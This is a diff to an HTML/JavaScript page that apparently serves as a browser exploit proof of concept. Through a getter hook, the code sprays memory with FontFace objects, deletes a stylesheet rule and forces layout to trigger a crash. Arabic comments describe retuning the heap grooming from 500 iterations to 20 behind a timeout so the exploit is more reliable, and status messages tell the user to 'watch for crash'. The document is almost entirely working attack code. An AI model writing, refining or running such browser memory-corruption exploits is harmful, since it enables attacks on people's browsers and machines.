@@ -6,7 +6,7 @@
     </style>
 </head>
 <body>
-    <div id="debug" style="color:red; font-family:monospace;">Status: Waiting...</div>
+    <div id="debug" style="color:blue; font-family:monospace;">Status: Waiting...</div>
     <script>
         const debug = document.getElementById('debug');
         debug.innerText = "Status: Script Started.";
@@ -22,18 +22,20 @@
                 get() {
                     if (!fired && this === A) {
                         fired = true;
-                        debug.innerText = "Status: HOOK TRIGGERED (Memory Grooming Initiated)";
+                        debug.innerText = "Status: HOOK TRIGGERED. Spraying memory...";
                         
-                        // هذه هي القنبلة التي تسبب OOM - وهي ضرورية!
-                        for(let i=0; i<500; i++) {
-                            new FontFace('y', 'local(Helvetica)');
-                            new FontFace('z', 'local(Helvetica)');
-                        }
+                        // هنا التغيير: تقليل العدد واستخدام setTimeout لمنع الانفجار الفوري
+                        setTimeout(() => {
+                            for(let i=0; i<20; i++) { // خفضنا العدد إلى 20 بدلاً من 500
+                                new FontFace('y'+i, 'local(Helvetica)');
+                            }
+                            
+                            document.getElementById('s').sheet.deleteRule(0);
+                            document.body.offsetTop;
+                            
+                            debug.innerText = "Status: Grooming complete. Watch for crash.";
+                        }, 10); // 10ms تأخير كافٍ جداً للمتصفح ليحافظ على استقراره
                         
-                        document.getElementById('s').sheet.deleteRule(0);
-                        document.body.offsetTop;
-                        
-                        debug.innerText = "Status: Trigger Executed. If it crashes now, it's successful.";
                     }
                     return undefined;
                 }
